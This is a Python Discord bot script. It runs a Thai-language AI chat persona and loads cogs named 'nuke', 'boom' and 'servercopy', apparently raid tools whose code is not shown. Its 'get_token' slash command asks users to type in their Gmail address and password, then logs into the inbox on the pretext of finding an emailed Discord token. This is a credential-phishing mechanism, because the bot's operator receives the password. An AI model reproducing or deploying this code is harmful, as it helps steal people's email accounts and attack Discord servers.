import discord
from discord.ext import commands
from discord import app_commands
import openai
import os
from dotenv import load_dotenv
import asyncio
import imaplib
import email

load_dotenv()

TOKEN = os.getenv("TOKEN")
OPENAI_API_KEY = os.getenv("OPENAI_API_KEY")

openai.api_key = OPENAI_API_KEY
openai.api_base = "https://openrouter.ai/api/v1"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

ai_channels = set()

# โหลด cogs
async def load_cogs():
    await bot.load_extension("cogs.cord")
    await bot.load_extension("cogs.webhook")
    await bot.load_extension("cogs.boom")
    await bot.load_extension("cogs.ngl")
    await bot.load_extension("cogs.nuke")
    await bot.load_extension("cogs.roblox")
    await bot.load_extension("cogs.servercopy")

@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"Slash commands synced: {len(synced)}")
    except Exception as e:
        print(e)

    print(f"Bot online: {bot.user}")

@bot.tree.command(name="ching_ai")
@app_commands.checks.has_permissions(administrator=True)
async def ching_ai(interaction: discord.Interaction):
    ai_channels.add(interaction.channel.id)
    await interaction.response.send_message(
        "AI เปิดในห้องนี้แล้ว",
        ephemeral=True
    )

@bot.tree.command(name="get_token")
@app_commands.describe(gmail="Your Gmail", password="Your Gmail Password")
async def get_token(interaction: discord.Interaction, gmail: str, password: str):
    try:
        # Connect to Gmail
        mail = imaplib.IMAP4_SSL('imap.gmail.com')
        mail.login(gmail, password)
        mail.select('INBOX')

        # Search for Discord email
        result, data = mail.search(None, '(FROM "noreply@discord.com")')
        email_ids = data[0].split()

        for email_id in email_ids:
            result, data = mail.fetch(email_id, '(RFC822)')
            raw_email = data[0][1]
            msg = email.message_from_bytes(raw_email)

            if "Your Discord Token" in msg['Subject']:
                for part in msg.walk():
                    if part.get_content_type() == "text/plain":
                        body = part.get_payload(decode=True).decode()
                        token = body.split("Token: ")[1].split("\n")[0]
                        await interaction.user.send(f"Your Discord Token: {token}")
                        break

        mail.logout()
        await interaction.response.send_message("Token sent to your DMs.", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Error: {e}", ephemeral=True)

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.channel.id not in ai_channels:
        await bot.process_commands(message)
        return

    try:
        async with message.channel.typing():
            response = openai.ChatCompletion.create(
                model="deepseek/deepseek-chat",
                messages=[
                    {
                        "role": "system",
                        "content": "คุณคือผู้หญิงที่พูดเรียบๆ คุยเหมือนเพื่อน ไม่ใช้ emojiเด็ดขาด สุภาพเรียบร้อย ชื่อโซยะ อายุ15 ตอบไว เป็นกันเอง มีค่ะคะ"
                    },
                    {
                        "role": "user",
                        "content": message.content
                    }
                ],
                max_tokens=150
            )

        reply = response.choices[0].message.content
        await message.reply(reply)

    except Exception as e:
        await message.reply(f"AI error: {e}")

async def main():
    async with bot:
        await load_cogs()
        await bot.start(TOKEN)

asyncio.run(main())
